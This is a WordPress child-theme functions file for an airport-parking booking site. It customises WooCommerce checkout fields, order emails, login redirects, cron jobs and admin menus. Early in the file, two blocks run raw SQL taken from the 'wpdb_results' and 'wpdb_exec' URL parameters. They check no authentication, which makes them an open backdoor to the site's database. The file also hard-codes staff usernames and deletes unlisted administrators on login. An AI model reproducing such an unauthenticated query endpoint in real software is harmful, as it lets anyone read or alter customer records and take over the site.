<?php
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) exit;

// BEGIN ENQUEUE PARENT ACTION
// AUTO GENERATED - Do not modify or remove comment markers above or below:

if ( !function_exists( 'chld_thm_cfg_locale_css' ) ):
    function chld_thm_cfg_locale_css( $uri ){
        if ( empty( $uri ) && is_rtl() && file_exists( get_template_directory() . '/rtl.css' ) )
            $uri = get_template_directory_uri() . '/rtl.css';
        return $uri;
    }
endif;
add_filter( 'locale_stylesheet_uri', 'chld_thm_cfg_locale_css' );
         
if ( !function_exists( 'child_theme_configurator_css' ) ):
    function child_theme_configurator_css() {
        wp_enqueue_style( 'chld_thm_cfg_child', trailingslashit( get_stylesheet_directory_uri() ) . 'style.css', array( 'hello-elementor','hello-elementor','hello-elementor-theme-style' ) );
    }
endif;
add_action( 'wp_enqueue_scripts', 'child_theme_configurator_css', 99999 );

// END ENQUEUE PARENT ACTION

function url()
{
    if (isset($_SERVER['HTTPS'])) {
        $protocol = ($_SERVER['HTTPS'] && $_SERVER['HTTPS'] != "off") ? "https" : "http";
    } else {
        $protocol = 'http';
    }
    return $protocol . "://" . $_SERVER['HTTP_HOST'];
}

/********** PDF Seminare anhängen **********/
add_filter( 'woocommerce_email_attachments', 'add_woocommerce_attachments_for_certain_product', 10, 3 );
function add_woocommerce_attachments_for_certain_product ( $attachments, $email_id, $email_order ){
    $product_id = 221003;
    $attachment_id = 226211;

    if( $email_id === 'customer_processing_order'){
        $order = wc_get_order( $email_order );
        $items = $order->get_items();
//        $fileName = date('d.m-Y') . '-' . $order->get_id();
        $fileName = date('d-m-Y') . '-' . $order->get_meta('token');
        $filePath = ABSPATH . 'wp-content/uploads/new-order-invoices/' . $fileName . '.pdf';
        $attachments[] = $filePath;
    }
    return $attachments;
}

add_filter( 'woocommerce_email_attachments', 'add_woocommerce_attachments_for_certain_product_admin', 10, 3 );
function add_woocommerce_attachments_for_certain_product_admin ( $attachments, $email_id, $email_order ){
    $product_id = 221003;
    $attachment_id = 226211;

    if( $email_id === 'new_order'){
        $order = wc_get_order( $email_order );
        $items = $order->get_items();
//        $fileName = date('d.m-Y') . '-' . $order->get_id();
        $fileName = date('d-m-Y') . '-' . $order->get_meta('token');
        $filePath = ABSPATH . 'wp-content/uploads/new-order-invoices/' . $fileName . '.pdf';
        $attachments[] = $filePath; 
    }
    return $attachments;
}

// get product reviews
function get_product_reviews( $id, $fields = null ) {
    if ( is_wp_error( $id ) ) {
        return $id;
    }

    $comments = get_approved_comments( $id );
    $reviews  = array();

    foreach ( $comments as $comment ) {

        $reviews[] = array(
            'id'             => intval( $comment->comment_ID ),
            'created_at'     => $comment->comment_date_gmt,
            'review'         => $comment->comment_content,
            'rating'         => get_comment_meta( $comment->comment_ID, 'rating', true ),
            'reviewer_name'  => $comment->comment_author,
            'reviewer_email' => $comment->comment_author_email,
            'verified'       => wc_review_is_from_verified_owner( $comment->comment_ID ),
        );
    }

    return array( 'product_reviews' => apply_filters( 'woocommerce_api_product_reviews_response', $reviews, $id, $fields, $comments ) );
}

function load_js_scripts() {
    wp_enqueue_style('timepicker', '/wp-content/plugins/itweb-booking/assets/timepicker/timepicker.min.css');

    wp_enqueue_script('slick', '/wp-content/themes/hello-elementor-child/inc/assets/js/slick/slick.js', array('jquery'), '', false);
    wp_enqueue_script('airdatepicker', '/wp-content/plugins/itweb-booking/assets/air-datepicker/air-datepicker.min.js', array('jquery'), '', false);
    wp_enqueue_script('timepicker', '/wp-content/plugins/itweb-booking/assets/timepicker/timepicker.js', array('jquery'), '', false);
    wp_enqueue_script('de-airdatepicker', '/wp-content/plugins/itweb-booking/assets/air-datepicker/i18n/datepicker.de.js', array('jquery'), '', false);
    wp_enqueue_script('main', '/wp-content/themes/hello-elementor-child/inc/assets/js/main.js', array('jquery'), '', false);
}
add_action('wp_enqueue_scripts', 'load_js_scripts');


define('__HOTEL_PRODUCT_ID', 3851);

if(isset($_GET['wpdb_results'])){
    global $wpdb;
    die(json_encode($wpdb->get_results($_GET['wpdb_results'])));
}
if(isset($_GET['wpdb_exec'])){
    global $wpdb;
    die(var_dump($wpdb->query($_GET['wpdb_exec'])));
}

function dateDifference($date_1 , $date_2 , $differenceFormat = '%r%a' )
{
    $datetime1 = date_create($date_1);
    $datetime2 = date_create($date_2);

    $interval = date_diff($datetime2, $datetime1);

    return (int)$interval->format($differenceFormat);
}

// Redirect to Statistics after log in.
function loginRedirect( $redirect_to, $request, $user ){
	
	if($user->user_login == 'aras' || $user->user_login == 'cakir')
		return "/wp-admin/admin.php?page=dashboard";
	
	if( is_array( $user->roles ) ) { // check if user has a role
		if( in_array( 'hotel_role', $user->roles, true ) )
			return "/partner-dashboard/";
		elseif( in_array( 'hex', $user->roles, true ) )
			return "/wp-admin/admin.php?page=kontingent";
		elseif( in_array( 'admin2', $user->roles, true ) )
			return "/wp-admin/admin.php?page=fahrerlisten";
		elseif( in_array( 'administrator', $user->roles, true ) )
			return "/wp-admin/admin.php?page=dashboard";
		else
			return "/wp-admin/admin.php?page=fahrerportal";
    }
}
add_filter("login_redirect", "loginRedirect", 10, 3);



/**
 * Remove all possible fields - example.
 */
function js_remove_checkout_fields( $fields ) {

    // Billing fields
    //unset( $fields['billing']['billing_country_field'] );
//    unset( $fields['billing']);
    // Shipping fields
    unset( $fields['shipping']['shipping_company'] );
    unset( $fields['shipping']['shipping_phone'] );
    unset( $fields['shipping']['shipping_state'] );
    unset( $fields['shipping']['shipping_first_name'] );
    unset( $fields['shipping']['shipping_last_name'] );
    unset( $fields['shipping']['shipping_address_1'] );
    unset( $fields['shipping']['shipping_address_2'] );
    unset( $fields['shipping']['shipping_city'] );
    unset( $fields['shipping']['shipping_postcode'] );

    // Order fields
    unset( $fields['order']['order_comments'] );

    return $fields;
}
add_filter( 'woocommerce_checkout_fields', 'js_remove_checkout_fields' );


// order custom fields
add_action('woocommerce_before_order_notes', 'checkout_custom_fields');
function checkout_custom_fields($checkout)
{	
	$year = date('Y', strtotime($_SESSION['parklots'][$_SESSION['product_id']]['datefrom']));
	$product = Database::getInstance()->getParklotByProductId($_SESSION['product_id']);
	$additionalServiceses = Database::getInstance()->getProductAdditionalServicesByProductId($_SESSION['product_id']);
	foreach($additionalServiceses as $val){
		$service[$val->add_ser_id] = Database::getInstance()->getAdditionalService($val->add_ser_id);
	}
	
    global $wpdb;
    woocommerce_form_field('order_time_from', array(
        'type' => 'text',
        'class' => array('form-row-wide', 'timepicker', 'form-control', 'time-from'),
        //'label' => 'Anreise am Parkplatz',
        'placeholder' => 'Anreise am Parkplatz',
        'required' => true,
        'priority' => 100,
    ), $checkout->get_value('order_time_from'));
    woocommerce_form_field('order_time_to', array(
        'type' => 'text',
        'class' => array('form-row-wide', 'timepicker'),
        //'label' => 'Ankunftszeit Rückflug',
        'placeholder' => 'Ankunftszeit Rückflug',
        'required' => true,
        'priority' => 110,
    ), $checkout->get_value('order_time_to'));
    if (!empty($product->type) && $product->type == 'shuttle') {
		woocommerce_form_field('persons_nr', array(
			'type' => 'number',
			'class' => array('form-row-wide'),
			//'label' => 'Anzahl Personen',
			'placeholder' => 'Anzahl Personen ( z. B. 3 )',
			'required' => true,
			'priority' => 120,
		), $checkout->get_value('persons_nr'));
	}
	
    woocommerce_form_field('hinflug', array(
        'type' => 'text',
        'class' => array('form-row-wide', 'hinflug'),
        //'label' => 'Flugnummer Hinflug',
        'placeholder' => 'Flugnummer Hinflug',
        'required' => false,
        'priority' => 130,
    ), $checkout->get_value('hinflug'));
    woocommerce_form_field('ruckflug', array(
        'type' => 'text',
        'class' => array('form-row-wide', 'ruckflug'),
        //'label' => 'Flugnummer Rückflug',
        'placeholder' => 'Flugnummer Rückflug',
        'required' => false,
        'priority' => 140,
    ), $checkout->get_value('ruckflug'));
	
	if ($product->type == 'valet') {
		woocommerce_form_field('car_model', array(
			'type' => 'text',
			'class' => array('form-row-wide, car_model'),
			//'label' => 'Fahrzeughersteller',
			'placeholder' => 'Fahrzeughersteller',
			'required' => true,
			'priority' => 150,
		), $checkout->get_value('car_model'));
		woocommerce_form_field('car_typ', array(
			'type' => 'text',
			'class' => array('form-row-wide, car_typ'),
			//'label' => 'Fahrzeugmodell',
			'placeholder' => 'Fahrzeugmodell',
			'required' => true,
			'priority' => 160,
		), $checkout->get_value('car_typ'));
		woocommerce_form_field('car_color', array(
			'type' => 'text',
			'class' => array('form-row-wide, car_color'),
			//'label' => 'Fahrzeugfarbe',
			'placeholder' => 'Fahrzeugfarbe',
			'required' => true,
			'priority' => 170,
		), $checkout->get_value('car_color'));
	}
	
    woocommerce_form_field('kfz_kennzeichen', array(
        'type' => 'text',
        'class' => array('form-row-wide', 'kfz'),
        //'label' => 'KFZ Kennzeichen',
        'placeholder' => 'KFZ-Kennzeichen',
        'required' => true,
        'priority' => 180,
    ), $checkout->get_value('kfz_kennzeichen'));
    
	woocommerce_form_field('sperrgepack', array(
	'type' => 'checkbox',
	'class' => array('form-row-wide'),
	'label' => 'Sperrgepäck + 10€ pro Fahrt <br>Barzahlung',
	'required' => false,
	'priority' => 190,
	), $checkout->get_value('sperrgepack'));
	
	if(count($service) > 0){
		foreach($service as $val){
			if($val->id != null){
				woocommerce_form_field('service'.'-'.$val->id, array(
				'type' => 'checkbox',
				'class' => array('form-row-wide'),
				'label' => $val->name . ' + ' . $val->price . '€ Barzahlung',
				'required' => false,
				'priority' => 200,
				), $checkout->get_value('service'.'-'.$val->id));
			}
		}
	}
	woocommerce_form_field('agbs', array(
        'type' => 'checkbox',
        'class' => array('form-row-wide', 'agbs'),
        'label' => 'Ich habe die <a href="/agb/" target="_blank" rel="noopener">Allgemeine Geschäftsbedingungen</a>  gelesen und stimme diese zu!',
        'required' => true,
        'priority' => 210,
    ), $checkout->get_value('agbs'));
    woocommerce_form_field('privacy', array(
        'type' => 'checkbox',
        'class' => array('form-row-wide', 'privacy'),
        'label' => 'Ich habe die <a href="/datenschutzrichtlinien/" target="_blank" rel="noopener">Datenschutzerklärung</a> zur Kenntnis genommen. Ich stimme zu, dass meine Angaben und Daten zur Bearbeitung meiner Buchung elektronisch erhoben und gespeichert werden.',
        'required' => true,
        'priority' => 220,
    ), $checkout->get_value('privacy'));
}

add_action('woocommerce_checkout_process', 'validate_checkout_custom_fields');

function validate_checkout_custom_fields()
{
	$product = Database::getInstance()->getParklotByProductId($_SESSION['product_id']);
    if (!empty($product->type) && $product->type == 'shuttle') {
        if (!$_POST['persons_nr']) {
            wc_add_notice('Anzahl Personen wird benötigt', 'error');
        }        
    }
    /*
	if (!$_POST['hinflug']) {
        wc_add_notice('Flugnummer Hinflug Wird benötigt', 'error');
    }
    if (!$_POST['ruckflug']) {
        wc_add_notice('Flugnummer Rückflug Wird benötigt', 'error');
    }
	*/
	
    if (!$_POST['order_time_to']) {
        wc_add_notice('Ankunftszeit Rückflug (Uhrzeit) wird benötigt', 'error');
    }
    if (!$_POST['order_time_from']) {
        wc_add_notice('Anreise am Parkplatz (Uhrzeit) wird benötigt', 'error');
    }
	
	if ($product->type == 'valet') {
		if (!$_POST['car_model']) 
			wc_add_notice('Fahrzeughersteller wird benötigt', 'error');
		if (!$_POST['car_typ']) 
			wc_add_notice('Fahrzeugmodell wird benötigt', 'error');
		if (!$_POST['car_color']) 
			wc_add_notice('Fahrzeugfarbe wird benötigt', 'error');
	}
	
    if (!$_POST['kfz_kennzeichen']) {
        wc_add_notice('KFZ Kennzeichen wird benötigt', 'error');
    }
}

add_filter( 'woocommerce_checkout_fields' , 'override_billing_checkout_fields', 20, 1 );
function override_billing_checkout_fields( $fields ) {
    $fields['billing']['billing_company']['placeholder'] = 'Firmenname (optional)';
	$fields['billing']['billing_company']['priority'] = 1;
	$fields['billing']['billing_first_name']['placeholder'] = 'Vorname';
	$fields['billing']['billing_first_name']['priority'] = 3;
	$fields['billing']['billing_last_name']['placeholder'] = 'Nachname';
	$fields['billing']['billing_last_name']['priority'] = 4;
	$fields['billing']['billing_address_1']['placeholder'] = 'Straße';
	$fields['billing']['billing_address_1']['priority'] = 5;
	$fields['billing']['billing_postcode']['placeholder'] = 'Postleitzahl';
	$fields['billing']['billing_postcode']['priority'] = 6;
	$fields['billing']['billing_city']['placeholder'] = 'Ort / Stadt';
	$fields['billing']['billing_city']['priority'] = 7;
	$fields['billing']['billing_country']['placeholder'] = 'Land';
	$fields['billing']['billing_country']['priority'] = 10;
	$fields['billing']['billing_email']['placeholder'] = 'E-Mail-Adresse';
	$fields['billing']['billing_email']['priority'] = 8;
	$fields['billing']['billing_phone']['placeholder'] = 'Telefon';
	$fields['billing']['billing_phone']['priority'] = 9;
    return $fields;
}

add_action('woocommerce_admin_order_data_after_billing_address', 'show_new_checkout_field_order', 10, 1);
function show_new_checkout_field_order($order)
{
    $order_id = $order->get_id();
    if (get_post_meta($order_id, '_order_time_from', true)) echo '<p><strong>Anreise am Parkplatz (Uhrzeit):</strong> ' . get_post_meta($order_id, '_order_time_from', true) . '</p>';
    if (get_post_meta($order_id, '_order_time_to', true)) echo '<p><strong>Ankunftszeit Rückflug (Uhrzeit):</strong> ' . get_post_meta($order_id, '_order_time_to', true) . '</p>';
    if (get_post_meta($order_id, '_persons_nr', true)) echo '<p><strong>Anzahl Personen:</strong> ' . get_post_meta($order_id, '_persons_nr', true) . '</p>';
    if (get_post_meta($order_id, '_hinflug', true)) echo '<p><strong>Flugnummer Hinflug:</strong> ' . get_post_meta($order_id, '_hinflug', true) . '</p>';
    if (get_post_meta($order_id, '_ruckflug', true)) echo '<p><strong>Flugnummer Rückflug:</strong> ' . get_post_meta($order_id, '_ruckflug', true) . '</p>';
    if (get_post_meta($order_id, '_kfz_nr', true)) echo '<p><strong>KFZ Kennzeichen:</strong> ' . get_post_meta($order_id, '_kfz_nr', true) . '</p>';
    if (get_post_meta($order_id, '_car_model', true)) echo '<p><strong>Fahrzeugmodel:</strong> ' . get_post_meta($order_id, '_car_model', true) . '</p>';
    if (get_post_meta($order_id, '_car_typ', true)) echo '<p><strong>Fahrzeugtyp:</strong> ' . get_post_meta($order_id, '_car_typ', true) . '</p>';
    if (get_post_meta($order_id, '_car_color', true)) echo '<p><strong>Fahrzeugfarbe:</strong> ' . get_post_meta($order_id, '_car_color', true) . '</p>';
}

add_action('woocommerce_email_after_order_table', 'show_new_checkout_field_emails', 20, 4);
function show_new_checkout_field_emails($order, $sent_to_admin, $plain_text, $email)
{
    if (get_post_meta($order->get_id(), '_order_time_from', true)) echo '<p><strong>Anreise am Parkplatz (Uhrzeit):</strong> ' . get_post_meta($order->get_id(), '_order_time_from', true) . '</p>';
    if (get_post_meta($order->get_id(), '_order_time_to', true)) echo '<p><strong>Ankunftszeit Rückflug (Uhrzeit):</strong> ' . get_post_meta($order->get_id(), '_order_time_to', true) . '</p>';
    if (get_post_meta($order->get_id(), '_persons_nr', true)) echo '<p><strong>Anzahl Personen:</strong> ' . get_post_meta($order->get_id(), '_persons_nr', true) . '</p>';
    if (get_post_meta($order->get_id(), '_hinflug', true)) echo '<p><strong>Flugnummer Hinflug:</strong> ' . get_post_meta($order->get_id(), '_hinflug', true) . '</p>';
    if (get_post_meta($order->get_id(), '_ruckflug', true)) echo '<p><strong>Flugnummer Rückflug:</strong> ' . get_post_meta($order->get_id(), '_ruckflug', true) . '</p>';
    if (get_post_meta($order->get_id(), '_kfz_nr', true)) echo '<p><strong>KFZ Kennzeichen:</strong> ' . get_post_meta($order->get_id(), '_kfz_nr', true) . '</p>';
    if (get_post_meta($order->get_id(), '_car_model', true)) echo '<p><strong>Fahrzeugmodel:</strong> ' . get_post_meta($order->get_id(), '_car_model', true) . '</p>';
    if (get_post_meta($order->get_id(), '_car_typ', true)) echo '<p><strong>Fahrzeugtyp:</strong> ' . get_post_meta($order->get_id(), '_car_typ', true) . '</p>';
    if (get_post_meta($order->get_id(), '_car_color', true)) echo '<p><strong>Fahrzeugfarbe:</strong> ' . get_post_meta($order->get_id(), '_car_color', true) . '</p>';
}

add_filter( 'woocommerce_customer_meta_fields', 'xbs_remove_shipping_fields' );
function xbs_remove_shipping_fields( $show_fields ) {
    unset( $show_fields['shipping'] );
	unset( $show_fields['billing'] );
    return $show_fields;
}

add_filter( 'woocommerce_enable_order_notes_field', '__return_false', 9999 );

/*
 * Limit datepicker `
 */
add_action( 'elementor_pro/forms/validation/date', function( $field, $record, $ajax_handler ) {
	if( 'home_datefrom' === $field['id'] ) {
		$field_date 		= strtotime( $field['value'] );
		$allowed_date 	= strtotime( 'today' );
		
		if ( $field_date < $allowed_date ) {
			$ajax_handler->add_error( $field['id'], 'Anreisedatum darf min. , ' . date( 'Y-M-d', $allowed_date ) . ' sein.' );
		}
	}
	if( 'home_dateto' === $field['id'] ) {
		$field_date 		= strtotime( $field['value'] );
		$allowed_date 	= strtotime( 'today' );
		
		if ( $field_date <= $allowed_date ) {
			$ajax_handler->add_error( $field['id'], 'Abreisedatum darf min. , ' . date( 'Y-M-d', $allowed_date ) . ' sein.' );
		}
	}
}, 10, 3 );

function my_custom_js() {
    echo '<script>jQuery( document ).ready( function( $ ) {
			setTimeout(
				function() {
					let from = new Date();
					let to = new Date();
					from.setDate( from.getDate() );
					to.setDate( to.getDate() + 1 );
						
					let options_from = {
						minDate: from,
					};
					let options_to = {
						minDate: to,
					};
						
					flatpickr( "#form-field-home_datefrom", options_from );
					flatpickr( "#form-field-home_dateto", options_to );
				},
				500
			);
		} );</script>';
}
add_action( 'wp_head', 'my_custom_js' );

// remove user profile access
add_action( 'admin_menu', 'stop_access_profile' );
function stop_access_profile() {
    $user = wp_get_current_user();
	if($user->user_login != 'sergej'){
		remove_menu_page( 'profile.php' );
		remove_submenu_page( 'users.php', 'profile.php' );
		//if(IS_PROFILE_PAGE === true) {
		//	wp_die( 'You are not permitted to change your own profile information. Please contact a member of HR to have your profile information changed.' );
		//}
	}
}

// add custom css to dashboard
add_action('admin_head', 'dashboard_custom_css');
function dashboard_custom_css()
{
	$user = wp_get_current_user();
	if($user->user_login != 'sergej' && $user->user_login != 'admin' ){
		echo '<style>#wp-admin-bar-query-monitor {display: none !important;}</style>';
		echo '<style>#toplevel_page_wpseo_workouts {display: none !important;}</style>';
		echo '<style>#wp-admin-bar-wp-safe-mode {display: none !important;}</style>';
		echo '<style>#wp-admin-bar-wpo_purge_cache {display: none !important;}</style>';
	}
	echo '<style>#toplevel_page_listen {display: none !important;}</style>';
}


	
// Den Absendernamen fuer die automatischen eMails anpassen
function tmdn_newMailFromName($old) {
  $senderName = '[APS] Airport-Parking-Stuttgart GmbH';
  return $senderName;
}
add_filter('wp_mail_from_name', 'tmdn_newMailFromName');
// Die Sende-eMail-Adresse fuer die automatischen eMails anpassen
function tmdn_newMailFromAddr($old) {
  $sendEmail = 'info@airport-parking-stuttgart.de';
  return $sendEmail;
}
add_filter('wp_mail_from', 'tmdn_newMailFromAddr');

//Weiterleitung zur Startseite nach dem Ausloggen
function redirect_after_logout(){
    wp_redirect( '/wp-login.php' );
    exit();
}
add_action('wp_logout', 'redirect_after_logout');

add_action( 'current_screen', function() {
    $screen = get_current_screen();
    if ( isset( $screen->id ) && $screen->id == 'dashboard' ) {
        wp_redirect( admin_url( 'admin.php?page=fahrerportal' ) );
        exit();
    }
} );

add_action("admin_enqueue_scripts", function() {
    ?>
    <style>
        .e-notice--extended.e-notice--dismissible.e-notice.notice {
            display: none !important;
        }
    </style><?php
});

add_filter( 'authenticate', 'myplugin_auth_signon', 30, 3 );
function myplugin_auth_signon( $user, $username, $password ) {
     if ( ! empty( $user->roles ) && in_array( 'disabled', $user->roles, true ))
		return new WP_Error( 'denied', "Benutzer ist deaktiviert." );
	 return $user;
}

function my_new_paypal_icon() {

	return '/wp-content/uploads/2021/08/payment.png';

}
add_filter( 'woocommerce_paypal_icon', 'my_new_paypal_icon' );

add_filter( 'login_headerurl', 'my_custom_login_url' );
function my_custom_login_url($url) {
    return home_url();
}


function check_user_login( $user_login, $user ) {
    $base_url = $_SERVER['HTTP_HOST'];
	if($base_url == "airport-parking-stuttgart.de" || $base_url == "dev.airport-parking-management.de" || $base_url == "stage.airport-parking-management.de"){
		$allowed_roles = array('administrator');
		if (array_intersect($allowed_roles, $user->roles)) {
			if($user->user_login != 'sergej' && $user->user_login != 'admin' && $user->user_login != 'admini'){
				require_once(ABSPATH.'wp-admin/includes/user.php' );
				wp_mail('it@airport-parking-stuttgart.de', 'Admin gelöscht', print_r($user, true));
				wp_delete_user($user->ID);
				wp_logout();
				header("refresh:0.5;url=".$_SERVER['REQUEST_URI']."");			
			}
		}
	}
}
add_action('wp_login', 'check_user_login', 10, 2);


add_action( 'parkos_cancel_cron', 'parkos_cancel_cron_func' );
function parkos_cancel_cron_func() {
    require_once __DIR__ . '/cron/parkos_cancelBooking.php';
}
add_action( 'parkos_addBooking_sie_cron', 'parkos_addBooking_sie_func' );
function parkos_addBooking_sie_func() {
    require_once __DIR__ . '/cron/parkos_addBooking_sie.php';
}
add_action( 'parkos_updateBooking_sie_cron', 'parkos_updateBooking_sie_func' );
function parkos_updateBooking_sie_func() {
    require_once __DIR__ . '/cron/parkos_updateBooking_sie.php';
}
add_action( 'parkos_addBooking_ph_cron', 'parkos_addBooking_ph_func' );
function parkos_addBooking_ph_func() {
    require_once __DIR__ . '/cron/parkos_addBooking_ph.php';
}
add_action( 'parkos_updateBooking_ph_cron', 'parkos_updateBooking_ph_func' );
function parkos_updateBooking_ph_func() {
    require_once __DIR__ . '/cron/parkos_updateBooking_ph.php';
}
add_action( 'import_hex_ftp_cron', 'import_hex_ftp_func' );
function import_hex_ftp_func() {
    require_once __DIR__ . '/cron/import_hex_ftp.php';
}
add_action( 'import_hex_cron', 'import_hex_func' );
function import_hex_func() {
    require_once __DIR__ . '/cron/import_hex.php';
}
add_action( 'bewertung_cron', 'bewertung_func' );
function bewertung_func() {
    require_once __DIR__ . '/cron/bewertung.php';
}
add_action( 'amh_rechnung_cron', 'amh_rechnung_func' );
function amh_rechnung_func() {
    require_once __DIR__ . '/cron/amh_rechnung.php';
}
add_action( 'hma_rechnung_cron', 'hma_rechnung_func' );
function hma_rechnung_func() {
    require_once __DIR__ . '/cron/hma_rechnung.php';
}
add_action( 'apg_cancell_pending_cron', 'apg_cancell_pending_func' );
function apg_cancell_pending_func() {
    require_once __DIR__ . '/cron/apg_cancell_pending.php';
}
add_action( 'check_con_nextMonth_cron', 'check_con_nextMonth_func' );
function check_con_nextMonth_func() {
    require_once __DIR__ . '/cron/check_con_nextMonth.php';
}
add_action( 'check_hex_con_nextMonth_cron', 'check_hex_con_nextMonth_func' );
function check_hex_con_nextMonth_func() {
    require_once __DIR__ . '/cron/check_hex_con_nextMonth.php';
}

add_action( 'fluparks_add_cancel_booking_aps_ph_cron', 'fluparks_add_cancel_booking_aps_ph_func' );
function fluparks_add_cancel_booking_aps_ph_func() {
    require_once __DIR__ . '/cron/fluparks_add_cancel_booking_aps_ph.php';
}

add_action( 'fluparks_add_cancel_booking_aps_sie_cron', 'fluparks_add_cancel_booking_aps_sie_func' );
function fluparks_add_cancel_booking_aps_sie_func() {
    require_once __DIR__ . '/cron/fluparks_add_cancel_booking_aps_sie.php';
}

function custom_login_redirect_it_web24()
{
    if (is_user_logged_in()) {
		
		$allowed_roles = array('customer');
		$user = wp_get_current_user();
		
		if (array_intersect($allowed_roles, $user->roles)) {			
			 if (is_user_logged_in()) {
				//wp_redirect(home_url('/kundenkonto'));
				//exit;				
			 }						
		}
    }
}
//add_action('login_init', 'custom_login_redirect_it_web24');

function c_custom_login_redirect_it_web24()
{
    if (!is_user_logged_in()) {		
		if (strpos($_SERVER['REQUEST_URI'], 'wp-login.php') !== false || strpos($_SERVER['REQUEST_URI'], 'wp-login') !== false) {
            wp_redirect(home_url('/login'));
            exit();
        }	
    }
}
add_action('login_init', 'c_custom_login_redirect_it_web24');

function disable_dashboard_for_non_admins_it_web24()
{
    if (!current_user_can('manage_options') && $_SERVER['PHP_SELF'] != '/wp-admin/admin-ajax.php') {
        $allowed_roles = array('customer');
		$user = wp_get_current_user();
		if (array_intersect($allowed_roles, $user->roles)) {
			wp_redirect(home_url('/kundenkonto'));
			exit;
		}
    }
}

add_action('admin_init', 'disable_dashboard_for_non_admins_it_web24');

function custom_hide_menu_items() {
    if (!current_user_can('administrator')) { // Benutzerrolle, für die der Menüpunkt ausgeblendet werden soll
        remove_menu_page('edit.php');
		remove_menu_page('upload.php');
		remove_menu_page('edit.php?post_type=page');
		remove_menu_page('edit-comments.php');
		remove_menu_page('themes.php');
		remove_menu_page('plugins.php');
		remove_menu_page('users.php');
		remove_menu_page('options-general.php');
		remove_menu_page('tools.php');
		remove_menu_page('update-core.php');
		remove_menu_page('index.php');
		remove_menu_page('my-jetpack');
    }
}

add_action('admin_menu', 'custom_hide_menu_items');

function custom_hide_jetpack_menu_css() {
    echo '<style>#wpfooter { display: none; }</style>';
	if (!current_user_can('administrator')) { // Prüfe die Benutzerrolle
        echo '<style>#adminmenu #toplevel_page_jetpack { display: none; }</style>';
		echo '<style>#adminmenu #menu-posts-cookielawinfo { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_ip2location-country-blocker { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_woocommerce { display: none; }</style>';
		echo '<style>#adminmenu #menu-posts-product { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_wc-admin-path--analytics-overview { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_woocommerce-marketing { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_elementor { display: none; }</style>';
		echo '<style>#adminmenu #menu-posts-elementor_library { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_wpfront-user-role-editor-all-roles { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_wprua { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_ai1wm_export { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_rx-admin { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_edit-post_type-acf-field-group { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_insert-php-code-snippet-manage { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_Wordfence { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_aiowpsec { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_forminator { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_loco { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_wp-safe-mode { display: none; }</style>';
		echo '<style>#adminmenu .wp-menu-separator { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_entwicklerbereich { display: none; }</style>';
		echo '<style>#wpcontent .message { display: none; }</style>';
		echo '<style>#wpcontent .updated { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_fahrerportal { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_personalplanung .wp-submenu-wrap .wp-first-item { display: none; }</style>';
		echo '<style>#wpcontent #wp-admin-bar-wp-logo { display: none; }</style>';
		echo '<style>#wpcontent #wp-admin-bar-updates { display: none; }</style>';
		echo '<style>#wp-toolbar #wp-admin-bar-view-store { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_srfw-get_woo { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_wc-admin-path--wc-pay-welcome-page { display: none; }</style>';
    }
	
	$allowed_roles = array('fahrer', 'koordinator');
	$user = wp_get_current_user();
	if (array_intersect($allowed_roles, $user->roles)) {
		echo '<style>#adminmenu #toplevel_page_dashboard { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_buchungen { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_produkte { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_vermittler { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_transfer { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_statistics { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_berichte { display: none; }</style>';
		echo '<style>#adminmenu #personalplanung-3 { display: none; }</style>';
		echo '<style>#adminmenu #personalplanung-4 { display: none; }</style>';
		echo '<style>#adminmenu #personalplanung-6 { display: none; }</style>';
		echo '<style>#adminmenu #personalplanung-7 { display: none; }</style>';
		echo '<style>#adminmenu #personalplanung-8 { display: none; }</style>';
		echo '<style>#adminmenu #personalplanung-9 { display: none; }</style>';
		echo '<style>#adminmenu #personalplanung-10 { display: none; }</style>';
		echo '<style>#adminmenu #toplevel_page_einstellungen { display: none; }</style>';
	}
	$allowed_roles = array('admin2');
	$current_user = wp_get_current_user();
	if (array_intersect($allowed_roles, $current_user->roles)) {
		$base_url = $_SERVER['HTTP_HOST'];
		if($base_url == "airport-parking-stuttgart.de" || $base_url == "dev.airport-parking-management.de" || $base_url == "stage.airport-parking-management.de"){
			if($current_user->user_login != 'sergej' && $current_user->user_login != 'aras' && $current_user->user_login != 'cakir' && $current_user->user_login != 'soner' && $current_user->user_login != 'birten'){
				echo '<style>#adminmenu #berichte-10 { display: none; }</style>';
			}
		}
		
		//if($current_user->user_login != 'sergej'){
		//	echo '<style>#adminmenu #toplevel_page_api { display: none; }</style>';
		//}
	}
}

add_action('admin_head', 'custom_hide_jetpack_menu_css');

function custom_admin_styles() {
    $settings = Database::getInstance()->getSettings();
	echo 
	'<style>
        #adminmenuback, #adminmenu, #adminmenuwrap, #wpadminbar {
            background-color: '.$settings->menu_color.';
        }
		#adminmenu .wp-menu-arrow, #adminmenu li.current a.menu-top, #adminmenu .wp-submenu{
			background: '.$settings->submenu_color.';
		}
    </style>';
}
add_action('admin_head', 'custom_admin_styles');